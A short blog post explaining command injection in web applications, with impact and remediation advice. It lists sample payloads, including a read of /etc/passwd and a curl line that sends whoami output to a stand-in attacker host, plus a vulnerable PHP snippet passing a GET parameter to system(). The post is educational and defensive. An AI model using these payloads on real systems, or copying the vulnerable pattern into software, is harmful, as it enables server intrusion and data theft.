---
layout: post
title: "Command Injection in Web Applications"
date: 2026-07-17
---

Command injection occurs when user input is passed to system shells without proper sanitization.

## Payload Examples

### Basic Command Execution
```
; ls -la
| cat /etc/passwd
&& whoami
```

### Blind Command Injection
```
; sleep 10
| curl attacker.com/$(whoami)
```

### PHP-Specific
```php
$host = $_GET['host'];
$cmd = "ping -c 1 $host";
system($cmd);
```

## Impact

- Full server compromise
- Data exfiltration
- Lateral movement

## Remediation

- Avoid passing user input to system shells
- Use language-specific APIs instead of shell commands
- Implement strict input validation
- Run with minimal privileges

*Disclosed responsibly.*
